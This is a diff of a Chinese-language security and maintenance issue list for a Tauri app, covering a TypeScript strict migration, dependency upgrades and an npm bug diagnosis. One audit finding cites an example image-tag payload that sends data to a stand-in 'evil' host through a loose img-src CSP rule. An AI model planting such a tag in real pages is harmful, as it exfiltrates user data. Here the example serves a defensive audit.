@@ -62,16 +62,17 @@
 - **发现:** `tauri.conf.json:31` script-src 同时含 `'unsafe-eval' 'unsafe-inline'`，CSP 对 XSS 失去第二道拦截价值，DOMPurify 白名单成为唯一防线；`img-src http: https:` 是现成数据外泄通道（`<img src="https://evil/?d=...">` 绕过 `connect-src 'self'`）。img-src 的放开是 ISS-110/ISS-178 有意为之（外部图床图片加载），需产品层面权衡。
 - **建议:** 排查 Vditor/KaTeX/Mermaid 对 eval 的真实依赖逐项灰度摘除；保留并测试锚定 `connect-src 'self'`。
 
-#### ⬜ ISS-203 TypeScript strict 迁移
+#### ⬜→🖥 ISS-203 TypeScript strict 迁移（进行中,分支 fix/iss203-ts-strict,2026-08-29）
 
 - **发现:** `config/tsconfig.app.json` 与 `tsconfig.node.json` 均未开启 `strict`（`noImplicitAny` / `strictNullChecks` 缺省关闭），对以字符串管道为主的项目事故面偏大。
 - **建议:** 分两步：先开 `strictNullChecks` 修完编译错，再补齐其余 strict 开关；CI typecheck 已是门槛，一次性收益明显。
+- **推进（2026-08-29）:** 实测生产代码 96 文件 full strict 零错误,「分两步」不需要,一步到位 `strict: true`。49 条 strict 错误全部落在测试文件——根因是测试文件此前被 `exclude` 完全排除在 typecheck 外（盲区）。修法：24 个测试文件逐条修类型（未使用 React 导入 12、mock 泛型与 props 漂移、protected rootKey/never 收窄等）；新增 `config/tsconfig.test.json`（strict + vitest types）接入 `tsc -b` references,测试文件从此纳入 typecheck。顺带：npm `edgesOut` 报错经 `rm -rf node_modules && npm ci` 未复现于 homebrew npm,根因为 hermes npm 自带 arborist 8.0.5 缺陷——已记入 ISS-204 备注。验证 781/781 + lint + typecheck + build 全绿。
 
 #### ⬜ ISS-204 依赖升级批次（低风险小版本）
 
-- **清单:** vite 8.1→8.2、vitest 4.1.6→4.1.11、@playwright/test & playwright 1.60→1.62、typescript-eslint 8.65→8.68、globals/eslint minor、@tauri-apps/api 2.11.0→2.11.1、vditor 3.11.2→3.11.3、dompurify 3.4.3→3.4.14、docx 9.6.1→9.7.1、mammoth 1.12.1、vitejs/plugin-react 6.1.0。
+- **清单:** vite 8.1→8.2、vitest 4.1.6→4.1.11、@playwright/test & playwright 1.60→1.62、typescript-eslint 8.65→8.68、globals/eslint minor、@tauri-apps/api 2.11.0→2.11.1、vditor 3.11.2→3.11.3、~~dompurify 3.4.3→3.4.14~~（✅ 已于 2026-08-29 随 ISS-203 分支提前完成：audit 报 1 moderate〔IN_PLACE 跨 realm XSS 双公告〕，升级后 `npm audit` 0 vulnerabilities；全量单测回归通过）、docx 9.6.1→9.7.1、mammoth 1.12.1、vitejs/plugin-react 6.1.0。
 - **单列评估:** typescript 6.0→7.0（跨主版本）；jsdom 29→30（vitest 环境兼容性）；lucide-react 1.16→1.34（图标库跨度大，查 breaking）。
-- **备注:** `npm audit` 当前无法运行（node_modules 状态致 npm 自身报 `Cannot read properties of null (reading 'edgesOut')`），跑一次 `rm -rf node_modules && npm ci` 后再审计。
+- **备注（2026-08-29 更新）:** ~~`npm audit` 当前无法运行~~已恢复可运行。根因查明：全局 npm 位于 `~/.hermes/node`（npm 10.9.8 自带 @npmcli/arborist 8.0.5），其 `#loadPeerSet` 存在 `Cannot read properties of null (reading 'edgesOut')` 缺陷，`rm -rf node_modules && npm ci` 无法绕过；改用 `/opt/homebrew/bin/npm`（或 nvm node）一切正常。后续 npm install/audit 一律用 homebrew npm。
 
 ### 已接受的风险（不追踪）
 
